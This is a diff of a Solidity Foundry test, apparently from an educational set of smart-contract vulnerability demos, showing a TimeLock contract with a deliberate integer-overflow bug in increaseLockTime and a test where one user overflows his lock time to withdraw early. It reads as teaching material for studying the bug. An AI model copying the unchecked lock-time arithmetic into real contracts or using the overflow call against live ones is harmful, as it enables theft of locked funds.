@@ -9,42 +9,17 @@ import "forge-std/Test.sol";
 // User can also extend the wait time beyond the 1 week waiting period.
 
 /*
-1. Deploy TimeLock
-2. Deploy Attack with address of TimeLock
-3. Call Attack.attack sending 1 ether. You will immediately be able to
-   withdraw your ether.
+1. Alice and bob both have 1 Ether balance
+2. Deploy TimeLock Contract
+3. Alice and bob both deposit 1 Ether to TimeLock, they need to wait 1 week to unlock Ether
+4. Bob caused an overflow on his lockTime
+5, Alice can't withdraw 1 Ether, because the lock time not expired.
+6. Bob can withdraw 1 Ether, because the lockTime is overflow to 0
 
 What happened?
-Attack caused the TimeLock.lockTime to overflow and was able to withdraw
-before the 1 week waiting period.
+Attack caused the TimeLock.lockTime to overflow,
+and was able to withdraw before the 1 week waiting period.
 */
-
-contract ContractTest is Test {
-        TimeLock TimeLockContract;
-        Attack AttackerContract;   
-
-function testOverflow() public {
-    address alice = vm.addr(1);
-    address bob = vm.addr(2);
-    vm.deal(address(alice), 1 ether);   
-    vm.deal(address(bob), 1 ether); 
-    vm.startPrank(alice);    
-    TimeLockContract = new TimeLock();   
-    TimeLockContract.deposit{value: 1 ether}();
-    vm.stopPrank();
-
-    vm.startPrank(bob); 
-    AttackerContract = new Attack(TimeLockContract);  //exploit here
-    AttackerContract.attack{value: 1 ether}();
-    console.log("Bypassed timelock, AttackerContract of balance", address(AttackerContract).balance);
-    vm.stopPrank();
-    vm.prank(alice);   
-    console.log("Alice failed to withdraw, lock time not expired");
-    TimeLockContract.withdraw();
-
-    }
-    receive() payable external{}
-}
 
 contract TimeLock {
     mapping(address => uint) public balances;
@@ -56,7 +31,7 @@ contract TimeLock {
     }
 
     function increaseLockTime(uint _secondsToIncrease) public {
-        lockTime[msg.sender] += _secondsToIncrease;
+        lockTime[msg.sender] += _secondsToIncrease; // vulnerable
     }
 
     function withdraw() public {
@@ -71,21 +46,45 @@ contract TimeLock {
     }
 }
 
-contract Attack {
-    TimeLock timeLock;
+contract ContractTest is Test {
+    TimeLock TimeLockContract;
+    address alice;
+    address bob;
 
-    constructor(TimeLock _timeLock) {
-        timeLock = TimeLock(_timeLock);
-    }
+    function setUp() public {
+        TimeLockContract = new TimeLock();
+        alice = vm.addr(1);
+        bob = vm.addr(2);
+        vm.deal(alice, 1 ether);   
+        vm.deal(bob, 1 ether);
+    }    
+           
+    function testFailOverflow() public {
+        console.log("Alice balance", alice.balance);
+        console.log("Bob balance", bob.balance);
 
-    fallback() external payable {}
+        console.log("Alice deposit 1 Ether...");
+        vm.prank(alice);
+        TimeLockContract.deposit{value: 1 ether}();
+        console.log("Alice balance", alice.balance);
 
-    function attack() public payable {
-        timeLock.deposit{value: msg.value}();
- 
-        timeLock.increaseLockTime(
-            type(uint).max + 1 - timeLock.lockTime(address(this))
+        console.log("Bob deposit 1 Ether...");
+        vm.startPrank(bob); 
+        TimeLockContract.deposit{value: 1 ether}();
+        console.log("Bob balance", alice.balance);
+
+        // exploit here
+        TimeLockContract.increaseLockTime(
+            type(uint).max + 1 - TimeLockContract.lockTime(bob)
         );
-        timeLock.withdraw();
+
+        console.log("Bob will successfully to withdraw, because the lock time is overflowed");
+        TimeLockContract.withdraw();
+        console.log("Bob balance", bob.balance);
+        vm.stopPrank();
+
+        vm.prank(alice);
+        console.log("Alice will fail to withdraw, because the lock time not expired");
+        TimeLockContract.withdraw();    // expect revert
     }
 }
